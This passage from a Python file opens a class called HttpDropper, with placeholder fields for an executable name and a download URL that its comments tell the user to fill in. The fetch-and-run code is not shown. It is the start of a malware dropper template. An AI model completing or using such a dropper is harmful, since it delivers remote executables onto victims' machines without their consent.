...
class HttpDropper:
    def __init__(self):
        self.nameoftheexecutable = "NameOfExeHere.exe"  # -The full name of the executable you are trying to download must go here
        self.url = "http:\\http_url_goes_here" + self.nameoftheexecutable  # -The download url must go here excluding the filename
